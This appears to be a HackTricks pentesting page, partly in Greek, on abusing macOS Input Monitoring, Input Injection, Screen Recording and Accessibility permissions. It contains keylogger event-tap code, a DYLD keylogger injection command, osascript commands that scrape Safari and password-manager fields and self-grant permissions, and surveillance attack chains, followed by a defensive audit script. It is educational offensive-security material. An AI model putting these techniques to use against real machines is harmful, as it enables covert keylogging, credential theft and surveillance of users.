# macOS Επίβλεψη Εισόδου, Καταγραφή Οθόνης & Κατάχρηση Accessibility

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Three related TCC services control how applications can observe and interact with the user's desktop session:

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Παρακολούθηση Εισόδου** | Ανάγνωση όλων των συμβάντων πληκτρολογίου και ποντικιού σε ολόκληρο το σύστημα (keylogging) |
| `kTCCServicePostEvent` | **Εισαγωγή Εισόδου** | Εισαγωγή συνθετικών συμβάντων πληκτρολογίου και ποντικιού |
| `kTCCServiceScreenCapture` | **Καταγραφή Οθόνης** | Ανάγνωση του display buffer, λήψη screenshots, εγγραφή οθόνης |
| `kTCCServiceAccessibility` | **Accessibility** | Έλεγχος άλλων εφαρμογών μέσω του AXUIElement API, ανάγνωση στοιχείων UI |

These permissions are **the most dangerous combination** on macOS — together they provide:
- Πλήρες keylogging κάθε πληκτρολόγησης (κωδικοί, μηνύματα, πληροφορίες πιστωτικών καρτών)
- Καταγραφή οθόνης όλου του ορατού περιεχομένου
- Εισαγωγή συνθετικής εισόδου (κλικ σε κουμπιά, έγκριση διαλόγων)
- Πλήρης έλεγχος GUI ισοδύναμος με φυσική πρόσβαση

---

## Input Monitoring (kTCCServiceListenEvent)

### Πώς Λειτουργεί

macOS χρησιμοποιεί το **`CGEventTap` API** για να επιτρέπει σε διεργασίες να παρεμβάλλονται σε συμβάντα εισόδου από το Quartz event system. Μια διεργασία με άδεια ListenEvent μπορεί να δημιουργήσει ένα event tap που λαμβάνει **κάθε συμβάν πληκτρολογίου και ποντικιού** πριν ή μετά φτάσουν στην εφαρμογή-στόχο.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Εύρεση Entitled Binaries
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Εάν ένα binary με ListenEvent permission έχει επίσης **απενεργοποιημένη επαλήθευση βιβλιοθηκών** ή **επιτρέπει μεταβλητές περιβάλλοντος DYLD**, ένας επιτιθέμενος μπορεί να εγχύσει ένα dylib που καταχωρεί ένα CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Το injected dylib κληρονομεί το ListenEvent TCC grant του στόχου και καταγράφει όλα τα πατήματα πλήκτρων.

### Επίθεση: Credential Harvesting

Ένας εξελιγμένος keylogger μπορεί να συσχετίσει τα πατήματα πλήκτρων με την ενεργή εφαρμογή:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Πώς λειτουργεί

Η άδεια PostEvent επιτρέπει τη δημιουργία ενός event tap με **`kCGEventTapOptionDefault`** (can modify/inject events) αντί για ListenOnly. Αυτό επιτρέπει:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Επίθεση: Αυτοματοποιημένη Έγκριση Προτροπής TCC

Με το PostEvent, ένας επιτιθέμενος μπορεί να **προσομοιώσει το κλικ στο "Allow"** στους διαλόγους αδειών TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Καταγραφή οθόνης (kTCCServiceScreenCapture)

### Πώς λειτουργεί

Η άδεια καταγραφής οθόνης επιτρέπει την ανάγνωση του buffer της οθόνης χρησιμοποιώντας:
- **`CGWindowListCreateImage`** — καταγραφή οποιουδήποτε παραθύρου ή ολόκληρης της οθόνης
- **`ScreenCaptureKit`** (macOS 12.3+) — σύγχρονο API για streaming περιεχομένου οθόνης
- **`CGDisplayStream`** — καταγραφή οθόνης επιταχυνόμενη από hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Εύρεση εφαρμογών καταγραφής οθόνης
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Μια εγχυμένη διεργασία καταγραφής οθόνης μπορεί περιοδικά να καταγράψει καρέ και να χρησιμοποιήσει OCR για να εξαγάγει κωδικούς πρόσβασης:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Από την έκδοση **macOS Sonoma**, η καταγραφή οθόνης εμφανίζει μια **διαρκή ένδειξη** στη γραμμή μενού. Σε παλαιότερες εκδόσεις, η εγγραφή οθόνης μπορούσε να είναι εντελώς σιωπηλή. Ωστόσο, μια σύντομη στιγμιαία λήψη ενός καρέ μπορεί ακόμη να περάσει απαρατήρητη από τους χρήστες.

### Επίθεση: Session Recording

Η συνεχή εγγραφή οθόνης παρέχει πλήρη αναπαραγωγή της συνεδρίας του χρήστη:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Προσβασιμότητα (kTCCServiceAccessibility)

### Πώς λειτουργεί

Η πρόσβαση στη λειτουργία Προσβασιμότητας παρέχει έλεγχο άλλων εφαρμογών μέσω του **AXUIElement API**. Μια διεργασία με πρόσβαση στην προσβασιμότητα μπορεί να:

1. **Ανάγνωση** οποιουδήποτε στοιχείου UI σε οποιαδήποτε εφαρμογή (πεδία κειμένου, ετικέτες, κουμπιά, μενού)
2. **Πατά** κουμπιά και αλληλεπιδρά με στοιχεία ελέγχου
3. **Πληκτρολογεί** κείμενο σε οποιοδήποτε πεδίο κειμένου
4. **Πλοηγείται** σε μενού και διαλόγους
5. **Εξάγει** εμφανιζόμενα δεδομένα από οποιαδήποτε εκτελούμενη εφαρμογή
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Η πιο επικίνδυνη κατάχρηση λειτουργιών προσβασιμότητας είναι **η περιήγηση στις System Settings για να χορηγήσετε στο δικό σας malware επιπλέον δικαιώματα**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attack: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Επίθεση: Αυτοματοποιημένες ενέργειες χρήστη
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Αλυσίδες Επιθέσεων

### Αλυσίδα: Input Monitoring + Screen Capture = Πλήρης Επιτήρηση
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Αλυσίδα: Accessibility + PostEvent = Πλήρης απομακρυσμένος έλεγχος
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Αλυσίδα: Προσβασιμότητα → Αυτοχορήγηση κάμερας/μικροφώνου → Παρακολούθηση
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Ανίχνευση και Καταγραφή
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Αναφορές

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objectivesee.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
